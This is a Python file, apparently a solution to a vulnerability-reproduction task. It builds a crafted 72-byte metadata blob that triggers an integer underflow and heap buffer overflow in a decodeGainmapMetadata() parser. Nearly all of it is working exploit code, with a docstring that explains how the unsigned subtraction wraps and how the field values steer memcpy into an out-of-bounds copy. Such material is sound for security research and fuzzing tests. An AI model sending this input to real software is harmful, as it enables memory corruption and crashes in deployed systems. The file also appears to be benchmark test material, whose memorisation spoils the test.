import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers a heap buffer overflow
        in the decodeGainmapMetadata() function.

        The vulnerability is an integer underflow caused by subtracting a larger
        unsigned offset from a smaller unsigned size. This results in a large
        value due to wrap-around, which is then used as the size for a memcpy,
        leading to a heap buffer overflow.

        The function processes a metadata block that contains information for three
        color planes. For each plane, it reads 6 big-endian 32-bit integers:
        1. metadataSize
        2. metadataOffset
        3. dataSize
        4. width
        5. height
        6. stride
        This makes each plane's metadata 24 bytes, and the total for three
        planes is 72 bytes.

        To trigger the vulnerability, we craft a 72-byte metadata block where:
        - The total size of the block is 72 bytes. This becomes the first operand
          in the vulnerable subtraction `size - offset`.
        - In the metadata for the first plane, we set `metadataOffset` to 73,
          a value greater than the total size.
        - The subtraction `72 - 73` on unsigned integers underflows, resulting
          in a very large number for the memcpy size.
        - The `memcpy` uses `mGainmapMetadata->data() + metadataOffset` as the
          source. This itself is an out-of-bounds read, which will be detected
          by sanitizers.
        - The `metadataSize` field, which determines the destination buffer size
          for the memcpy, is set to 0. This ensures a clear heap overflow when
          copying a huge amount of data into a zero-sized buffer.

        The metadata for the other two planes is set to benign values to ensure
        the parser loop completes and the vulnerability is triggered by the first
        plane's data without premature errors. For these planes, the memcpy size
        is calculated to be 1, and the destination buffer is also set to 1,
        avoiding an overflow.
        """
        
        # The total size of the gainmap metadata payload.
        poc_len = 72

        # The offset value that will cause the integer underflow.
        # Must be greater than poc_len.
        trigger_offset = poc_len + 1

        poc = bytearray()

        # --- Plane 1: Trigger the vulnerability ---
        # metadataSize: Controls the size of the destination buffer for memcpy.
        # Set to 0 to make the overflow obvious.
        poc.extend(struct.pack('>I', 0))
        
        # metadataOffset: The value used in the vulnerable subtraction.
        poc.extend(struct.pack('>I', trigger_offset))
        
        # dataSize, width, height, stride: Set to small non-zero values
        # to avoid potential side-effects or unrelated crashes.
        for _ in range(4):
            poc.extend(struct.pack('>I', 1))

        # --- Planes 2 & 3: Benign data ---
        # Fill data for the next two planes to ensure the loop doesn't fail
        # on an out-of-bounds read before the vulnerability is triggered.
        for _ in range(2):
            # metadataSize: Set to 1 to allocate a small buffer.
            poc.extend(struct.pack('>I', 1))
            
            # metadataOffset: Set so that size to copy is 1.
            # size = poc_len - metadataOffset = 72 - 71 = 1.
            # This read and copy are within bounds.
            poc.extend(struct.pack('>I', poc_len - 1))
            
            # dataSize, width, height, stride
            for _ in range(4):
                poc.extend(struct.pack('>I', 1))
        
        return bytes(poc)
